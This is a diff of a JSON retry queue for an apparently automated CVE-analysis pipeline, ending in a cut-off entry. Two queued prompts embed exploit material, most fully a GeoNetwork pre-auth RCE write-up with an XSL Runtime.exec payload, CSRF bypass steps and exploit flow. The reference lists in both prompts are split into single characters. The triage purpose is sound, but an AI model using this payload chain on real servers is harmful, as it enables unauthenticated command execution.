@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794766521.7276242,
     "last_attempt": 1795035688.9027653,
-    "next_attempt": 1795085965.8484051,
+    "next_attempt": 1795138598.401704,
     "metadata": {},
     "task_id": "task_CVE-2026-129360_1794766521",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794766526.0475125,
     "last_attempt": 1795035688.9028234,
-    "next_attempt": 1795085945.8583496,
+    "next_attempt": 1795138552.102849,
     "metadata": {},
     "task_id": "task_CVE-2026-129359_1794766526",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794766531.6626856,
     "last_attempt": 1795005602.6652577,
-    "next_attempt": 1795085894.0529037,
+    "next_attempt": 1795138474.24671,
     "metadata": {},
     "task_id": "task_CVE-2026-109618_1794766531",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794766541.1734421,
     "last_attempt": 1795005602.6718788,
-    "next_attempt": 1795085888.3505793,
+    "next_attempt": 1795138479.2045093,
     "metadata": {},
     "task_id": "task_CVE-2026-109619_1794766541",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794784582.582378,
     "last_attempt": 1795005588.429808,
-    "next_attempt": 1795085892.2117732,
+    "next_attempt": 1795138479.9586701,
     "metadata": {},
     "task_id": "task_CVE-2025-29927_1794784582",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794801345.5196054,
     "last_attempt": 1795035688.9110568,
-    "next_attempt": 1795085958.0738256,
+    "next_attempt": 1795138574.273042,
     "metadata": {},
     "task_id": "task_CVE-2026-111760_1794801345",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794801364.6409314,
     "last_attempt": 1795005590.741964,
-    "next_attempt": 1795085882.658538,
+    "next_attempt": 1795138474.2314873,
     "metadata": {},
     "task_id": "task_CVE-2026-111497_1794801364",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794801369.9059289,
     "last_attempt": 1795005595.7489758,
-    "next_attempt": 1795085886.9021506,
+    "next_attempt": 1795138486.4715476,
     "metadata": {},
     "task_id": "task_CVE-2026-129357_1794801369",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794831552.2793565,
     "last_attempt": 1795005595.7550516,
-    "next_attempt": 1795085903.5066752,
+    "next_attempt": 1795138474.3990476,
     "metadata": {},
     "task_id": "task_CVE-2026-25863_1794831552",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794831556.581182,
     "last_attempt": 1795005595.7565706,
-    "next_attempt": 1795085890.340344,
+    "next_attempt": 1795138491.3608425,
     "metadata": {},
     "task_id": "task_CVE-2026-23694_1794831556",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794831571.959759,
     "last_attempt": 1795005595.762857,
-    "next_attempt": 1795085885.937342,
+    "next_attempt": 1795138487.289215,
     "metadata": {},
     "task_id": "task_CVE-2026-23693_1794831571",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794868799.4390535,
     "last_attempt": 1795005602.673132,
-    "next_attempt": 1795085889.3982537,
+    "next_attempt": 1795138485.8238797,
     "metadata": {},
     "task_id": "task_CVE-2026-3650_1794868799",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794868810.2296097,
     "last_attempt": 1795005595.765673,
-    "next_attempt": 1795085876.3618028,
+    "next_attempt": 1795138494.7267618,
     "metadata": {},
     "task_id": "task_CVE-2026-95518_1794868810",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794891249.0222297,
     "last_attempt": 1795035662.871316,
-    "next_attempt": 1795085882.507436,
+    "next_attempt": 1795138474.0088625,
     "metadata": {},
     "task_id": "task_CVE-2026-90436_1794891249",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794891258.360734,
     "last_attempt": 1795035664.9283326,
-    "next_attempt": 1795085894.9948936,
+    "next_attempt": 1795138479.9691522,
     "metadata": {},
     "task_id": "task_CVE-2026-99288_1794891258",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794924005.918591,
     "last_attempt": 1795035656.1623294,
-    "next_attempt": 1795085878.7987425,
+    "next_attempt": 1795138476.011475,
     "metadata": {},
     "task_id": "task_CVE-2026-130347_1794924005",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794924015.684207,
     "last_attempt": 1795035669.9422169,
-    "next_attempt": 1795085881.427995,
+    "next_attempt": 1795138479.3466856,
     "metadata": {},
     "task_id": "task_CVE-2026-59309_1794924015",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794953142.0192251,
     "last_attempt": 1795035664.9297721,
-    "next_attempt": 1795085900.2726429,
+    "next_attempt": 1795138491.3852386,
     "metadata": {},
     "task_id": "task_CVE-2026-98260_1794953142",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1794974284.878199,
     "last_attempt": 1795035664.9378207,
-    "next_attempt": 1795085904.562055,
+    "next_attempt": 1795138493.914998,
     "metadata": {},
     "task_id": "task_CVE-2026-114938_1794974284",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795005590.7375693,
     "last_attempt": 1795035656.1611059,
-    "next_attempt": 1795085855.310428,
+    "next_attempt": 1795138447.9439204,
     "metadata": {},
     "task_id": "task_CVE-2026-71961_1795005590",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795005597.6587603,
     "last_attempt": 1795035688.9124959,
-    "next_attempt": 1795085904.114521,
+    "next_attempt": 1795138490.1966894,
     "metadata": {},
     "task_id": "task_CVE-2026-71960_1795005597",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795005603.4506216,
     "last_attempt": 1795085851.121825,
-    "next_attempt": 1795085916.326789,
+    "next_attempt": 1795138501.1862292,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1795005603",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035633.288069,
     "last_attempt": 1795085845.3542562,
-    "next_attempt": 1795085926.7127936,
+    "next_attempt": 1795138484.1087434,
     "metadata": {},
     "task_id": "task_CVE-2026-92182_1795035633",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035637.9804716,
     "last_attempt": 1795035679.962671,
-    "next_attempt": 1795085855.925887,
+    "next_attempt": 1795138442.5323384,
     "metadata": {},
     "task_id": "task_CVE-2026-126967_1795035637",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035643.6048443,
     "last_attempt": 1795085851.1233377,
-    "next_attempt": 1795085915.8937538,
+    "next_attempt": 1795138487.2906823,
     "metadata": {},
     "task_id": "task_CVE-2026-126979_1795035643",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035651.1513362,
     "last_attempt": 1795085851.1310802,
-    "next_attempt": 1795085934.9772542,
+    "next_attempt": 1795138478.5224886,
     "metadata": {},
     "task_id": "task_CVE-2026-126978_1795035651",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035657.859314,
     "last_attempt": 1795085830.324264,
-    "next_attempt": 1795085869.1215115,
+    "next_attempt": 1795138449.7477453,
     "metadata": {},
     "task_id": "task_CVE-2026-114202_1795035657",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035664.9234056,
     "last_attempt": 1795085835.3419843,
-    "next_attempt": 1795085878.2590501,
+    "next_attempt": 1795138447.6515694,
     "metadata": {},
     "task_id": "task_CVE-2026-100397_1795035664",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035683.8878813,
     "last_attempt": 1795085830.32277,
-    "next_attempt": 1795085875.6385353,
+    "next_attempt": 1795138452.242861,
     "metadata": {},
     "task_id": "task_CVE-2026-123007_1795035683",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795035691.4695642,
     "last_attempt": 1795085845.3529859,
-    "next_attempt": 1795085886.7398722,
+    "next_attempt": 1795138442.9248018,
     "metadata": {},
     "task_id": "task_CVE-2026-123633_1795035691",
     "required_result_fields": [
@@ -872,15 +872,15 @@
   {
     "cve_id": "CVE-2026-63219",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-63219\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"GeoNetwork is a catalog application to manage spatially referenced resources. Prior to versions 4.4.12 and 4.2.17, the API endpoint for creating a new formatter via file upload is unprotected and allows the upload of external uncontrolled files. An unauthenticated attacker can upload arbitrary `.xsl` or `.zip` formatter files to the server.  An unauthenticated attacker can write arbitrary files into the GeoNetwork formatter directory. On its own this constitutes unauthorized write access to server storage. The issue is patched in GeoNetwork versions 4.4.12 and 4.2.17.\", \"\\u6807\\u9898: GeoNetwork\\u672a\\u6388\\u6743\\u6587\\u4ef6\\u4e0a\\u4f20\\u6f0f\\u6d1e\"], \"published_date\": \"2026-09-03T18:17:22.997\", \"last_modified_date\": \"2026-09-09T21:09:13.080\", \"cvss_score\": 8.6, \"severity\": \"HIGH\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"d\", \"o\", \"c\", \"s\", \".\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"-\", \"o\", \"p\", \"e\", \"n\", \"s\", \"o\", \"u\", \"r\", \"c\", \"e\", \".\", \"o\", \"r\", \"g\", \"/\", \"4\", \".\", \"2\", \"/\", \"o\", \"v\", \"e\", \"r\", \"v\", \"i\", \"e\", \"w\", \"/\", \"c\", \"h\", \"a\", \"n\", \"g\", \"e\", \"-\", \"l\", \"o\", \"g\", \"/\", \"v\", \"e\", \"r\", \"s\", \"i\", \"o\", \"n\", \"-\", \"4\", \".\", \"2\", \".\", \"1\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"d\", \"o\", \"c\", \"s\", \".\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"-\", \"o\", \"p\", \"e\", \"n\", \"s\", \"o\", \"u\", \"r\", \"c\", \"e\", \".\", \"o\", \"r\", \"g\", \"/\", \"4\", \".\", \"4\", \"/\", \"o\", \"v\", \"e\", \"r\", \"v\", \"i\", \"e\", \"w\", \"/\", \"c\", \"h\", \"a\", \"n\", \"g\", \"e\", \"-\", \"l\", \"o\", \"g\", \"/\", \"v\", \"e\", \"r\", \"s\", \"i\", \"o\", \"n\", \"-\", \"4\", \".\", \"4\", \".\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"/\", \"c\", \"o\", \"r\", \"e\", \"-\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"/\", \"p\", \"u\", \"l\", \"l\", \"/\", \"9\", \"3\", \"4\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"/\", \"c\", \"o\", \"r\", \"e\", \"-\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"G\", \"H\", \"S\", \"A\", \"-\", \"m\", \"h\", \"2\", \"2\", \"-\", \"p\", \"r\", \"q\", \"r\", \"-\", \"v\", \"f\", \"4\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"t\", \"h\", \"e\", \"h\", \"a\", \"c\", \"k\", \"e\", \"r\", \"n\", \"e\", \"w\", \"s\", \".\", \"c\", \"o\", \"m\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"9\", \"/\", \"g\", \"e\", \"o\", \"n\", \"e\", \"t\", \"w\", \"o\", \"r\", \"k\", \"-\", \"f\", \"i\", \"x\", \"e\", \"s\", \"-\", \"u\", \"n\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"e\", \"d\", \"-\", \"r\", \"c\", \"e\", \".\", \"h\", \"t\", \"m\", \"l\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-63219 - Exploits & Severity - Feedly\n [description] Sep 3, 2026 · There is currently no public evidence of this vulnerability being exploited in real-world attacks, nor are there any proof-of-concept exploits, mitigations, or patches available.\n [link] https://feedly.com/cve/CVE-2026-63219\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-63219 - Vulnerability Details - OpenCVE\n [description] Sep 3, 2026 · Scan the formatter directory for unauthorized files, remove any that were added without proper approval, and monitor the directory for future unauthorized writes. Generated by OpenCVE AI on September 3, 2026 at 20:23 UTC.\n [link] https://app.opencve.io/cve/CVE-2026-63219\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-63219 - vulnerability database | Vulners.com\n [description] Sep 3, 2026 · CVE-2026-63219 (CVSS 8.6) is a missing authorization check on the GeoNetwork formatter upload API endpoint, affecting versions prior to 4.4.12 and 4.2.17 . An unauthenticated attacker can upload arbitrary .xsl or .zip files into the server formatt...\n [link] https://vulners.com/cve/CVE-2026-63219\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-63219 : Unprotected File Upload Vulnerability in ...\n [description] Sep 3, 2026 · Explore the unprotected file upload vulnerability affecting GeoNetwork and how to secure your system against CVE-2026-63219.\n [link] https://securityvulnerability.io/vulnerability/CVE-2026-63219\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-63219 GeoNetwork API Endpoint unrestricted upload ...\n [description] Sep 3, 2026 · A vulnerability has been found in GeoNetwork up to 4.2.16/4.4.11. This vulnerability is listed as CVE-2026-63219. It is suggested to upgrade the affected component.\n [link] https://vuldb.com/vuln/398529\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/99985a4f75bdb162415e0064d6baef02/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 Talha Kacar\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/99985a4f75bdb162415e0064d6baef02/README.md\n---\n# GeoNetwork PreAuth RCE - CVE-2026-63219 + CVE-2026-58400\n\nA proof-of-concept exploit for an unauthenticated remote code execution chain in GeoNetwork versions up to and including 4.4.11.0.\n\n---\n\n## Overview\n\nGeoNetwork is an open-source geospatial metadata catalog built on Java/Spring. This exploit chains two vulnerabilities to achieve unauthenticated RCE:\n\n| CVE | Type | CVSS | Component |\n|-----|------|------|-----------|\n| CVE-2026-63219 | Missing authorization on formatter upload | 8.6 | `FormatterAdminApi` |\n| CVE-2026-58400 | Saxon XSLT Java extension execution | 9.1 | Saxon-HE processor |\n\n**Affected versions:** GeoNetwork <= 4.4.11.0  \n**Authentication required:** None  \n**Network access required:** Yes (HTTP)\n\n---\n\n## Vulnerability Details\n\n### CVE-2026-63219 - Unauthenticated Formatter Upload\n\n`FormatterAdminApi.uploadFormatter()` is missing the `@PreAuthorize` annotation that the rest of the admin API endpoints use. This means any unauthenticated user can POST a `.xsl` file to `/geonetwork/srv/api/formatters`.\n\nUploaded files are stored at:\n```\n/var/lib/geonetwork/data/formatter/<name>/view.xsl\n```\n\nThe formatter name (and therefore the trigger path) is derived directly from the uploaded filename.\n\nOne non-obvious requirement: the request **must** include `Accept: application/json`. Without it, GeoNetwork's dispatcher returns a 500 \"Service not found\" before the upload handler is reached.\n\n### CVE-2026-58400 - Saxon XSLT Java Extension RCE\n\nGeoNetwork initializes the Saxon-HE XSLT processor with `ALLOW_EXTERNAL_FUNCTIONS=true`. Saxon's Java extension mechanism allows binding arbitrary Java class namespaces inside an XSL stylesheet:\n\n```xml\nxmlns:rt=\"java:java.lang.Runtime\"\n```\n\nWith this, `java.lang.Runtime.exec()` becomes callable directly from XSL, enabling OS command execution when a formatter is triggered.\n\nFormatters are triggered via:\n```\nGET /geonetwork/srv/api/records/{UUID}/formatters/{formatterName}\n```\n\nA valid metadata record UUID is required in the URL - GeoNetwork validates it before invoking Saxon. Any existing record UUID in the catalog works; the XSL ignores the record content entirely.\n\n### Reading Command Output\n\n`Runtime.exec()` returns a `Process` object. Output is read through the process's `InputStream`. The reliable approach in Saxon is to wrap it with `InputStreamReader` -> `BufferedReader` and call `readLine()`:\n\n```xml\n<xsl:variable name=\"rt\"   select=\"rt:getRuntime()\"/>\n<xsl:variable name=\"proc\" select=\"rt:exec($rt, ('bash', '-c', 'id'))\"/>\n<xsl:variable name=\"is\"   select=\"proc:getInputStream($proc)\"\n                          xmlns:proc=\"java:java.lang.Process\"/>\n<xsl:variable name=\"isr\"  select=\"isr:new($is)\"/>\n<xsl:variable name=\"br\"   select=\"br:new($isr)\"/>\n<result><xsl:value-of select=\"br:readLine($br)\"/></result>\n```\n\nEach method call must be assigned to its own `xsl:variable`. Chained calls (e.g. `sc:next(sc:useDelimiter($s,'\\A'))`) fail silently in Saxon because the intermediate return value is not correctly retained between calls.\n\n### CSRF Bypass\n\nSpring's CSRF protection requires a valid token for state-changing requests. GeoNetwork uses the double-submit cookie pattern:\n\n1. Send a GET to `/api/me` — the response sets an `XSRF-TOKEN` cookie\n2. Echo that value in the `X-XSRF-TOKEN` request header on the POST\n\nNo login is needed; the token is handed out to unauthenticated requests.\n\n---\n\n## Exploit Flow\n\n```\nAttacker                                  GeoNetwork\n   |                                        |\n   |-- GET /api/me ---------------------->  |\n   |<-- Set-Cookie: XSRF-TOKEN=<tok> -----  |\n   |                                        |\n   |-- POST /api/formatters ------------->  |  (CVE-2026-63219)\n   |   X-XSRF-TOKEN: <tok>                  |  writes malicious.xsl to disk\n   |   file=malicious.xsl \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 2,
+    "retry_count": 3,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1795085820.3018124,
-    "last_attempt": 1795085845.361793,
-    "next_attempt": 1795085864.4874003,
+    "last_attempt": 1795138427.0287843,
+    "next_attempt": 1795138471.4171498,
     "metadata": {},
     "task_id": "task_CVE-2026-63219_1795085820",
     "required_result_fields": [
@@ -909,7 +909,7 @@
     "last_error": "API返回空结果",
     "created_at": 1795085825.3169255,
     "last_attempt": 1795085840.3473449,
-    "next_attempt": 1795085860.6148245,
+    "next_attempt": 1795138431.0487244,
     "metadata": {},
     "task_id": "task_CVE-2026-58400_1795085825",
     "required_result_fields": [
@@ -930,17 +930,46 @@
   {
     "cve_id": "CVE-2026-51994",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-51994\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"mcp-remote versions 0.1.32 through 0.1.38 are vulnerable to Server-Side Request Forgery (SSRF) via the resource_metadata URL extracted from a remote MCP server's WWW-Authenticate header\", \"\\u6807\\u9898: mcp-remote SSRF\\u6f0f\\u6d1e\"], \"published_date\": \"2026-09-24T15:17:22.947\", \"last_modified_date\": \"2026-09-25T19:17:26.853\", \"cvss_score\": 9.1, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"g\", \"e\", \"e\", \"l\", \"e\", \"n\", \"/\", \"m\", \"c\", \"p\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"g\", \"e\", \"e\", \"l\", \"e\", \"n\", \"/\", \"m\", \"c\", \"p\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"l\", \"a\", \"y\", \"b\", \"0\", \"t\", \"/\", \"m\", \"c\", \"p\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"-\", \"o\", \"a\", \"u\", \"t\", \"h\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"#\", \"r\", \"e\", \"a\", \"d\", \"m\", \"e\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"l\", \"a\", \"y\", \"b\", \"0\", \"t\", \"/\", \"m\", \"c\", \"p\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"-\", \"o\", \"a\", \"u\", \"t\", \"h\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"b\", \"l\", \"o\", \"b\", \"/\", \"v\", \"1\", \".\", \"0\", \".\", \"1\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"F\", \"-\", \"0\", \"1\", \"-\", \"r\", \"e\", \"s\", \"o\", \"u\", \"r\", \"c\", \"e\", \"-\", \"m\", \"e\", \"t\", \"a\", \"d\", \"a\", \"t\", \"a\", \"-\", \"s\", \"s\", \"r\", \"f\", \".\", \"m\", \"d\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/22a9a690958f7f6035ae6e770b1fb6d2/CITATION.cff\n---\ncff-version: 1.2.0\nmessage: \"If you use or reference this research, please cite it using this metadata.\"\ntitle: \"mcp-remote OAuth Trust-Boundary Security Advisories\"\nauthors:\n  - family-names: \"Gercog\"\n    given-names: \"Alex\"\n    alias: \"playb0t\"\nversion: 1.0.2\ndate-released: 2026-09-29\nlicense: CC-BY-4.0\nurl: \"https://github.com/playb0t/mcp-remote-oauth-security\"\nrepository-code: \"https://github.com/playb0t/mcp-remote-oauth-security\"\npreferred-citation:\n  type: report\n  title: \"mcp-remote OAuth Trust-Boundary Security Advisories\"\n  authors:\n    - family-names: \"Gercog\"\n      given-names: \"Alex\"\n      alias: \"playb0t\"\n  version: 1.0.2\n  date-released: 2026-09-29\n  url: \"https://github.com/playb0t/mcp-remote-oauth-security\"\nkeywords:\n  - MCP\n  - OAuth\n  - security research\n  - SSRF\n  - responsible disclosure\n\n\n---\n/tmp/22a9a690958f7f6035ae6e770b1fb6d2/CORRECTIONS.md\n---\n# Corrections in v1.0.1\n\n`v1.0.1` is a corrective release of the research package. The original\n`v1.0.0` tag remains an immutable historical snapshot.\n\n## Version ranges\n\nThe original README applied `0.1.16–0.1.38` to all seven records. Full release\nhistory shows that the relevant paths entered the package at different times:\n\n| ID | Corrected relevant versions |\n|---|---|\n| F-01 | `0.1.32–0.1.38` |\n| F-02 | `0.1.32–0.1.38` |\n| F-04 | `0.0.14–0.1.38` |\n| F-08 | `0.1.16–0.1.38` |\n| F-09 | `0.0.11–0.1.38` |\n| F-10 | `0.1.32–0.1.38` |\n| F-11 | `0.0.18–0.1.38` |\n\nFor F-04 and F-11, these are the releases containing the relevant construction,\nnot a claim that every listed release is exploitable.\n\n## Severity scores\n\nThe original package included researcher-proposed CVSS v3.1 scores. Three\ndisplayed numbers did not match their vectors:\n\n- F-04: published `5.9`; the vector calculates to `6.3`;\n- F-08: published `5.4`; the vector calculates to `5.0`;\n- F-10: published `7.5`; the vector calculates to `6.5`.\n\nThe corrective release removes all provisional numeric scores because the\ndemonstrated evidence does not independently establish every impact metric.\nFuture CNA records may assign or merge severity differently.\n\n## Reclassified records\n\n### F-04\n\nThe original practical collision claim confused a chosen-prefix collision with\na second-preimage problem against an already fixed trusted identifier. F-04 now\nrecords MD5 namespace hardening; no practical token namespace takeover is\nclaimed.\n\n### F-11\n\nThe pinned SDK checks SSE endpoint origin, and the pinned HTTP implementation\nremoves credentials on cross-origin redirects. F-11 now records an explicit\nwrapper-level origin check as defense-in-depth; no 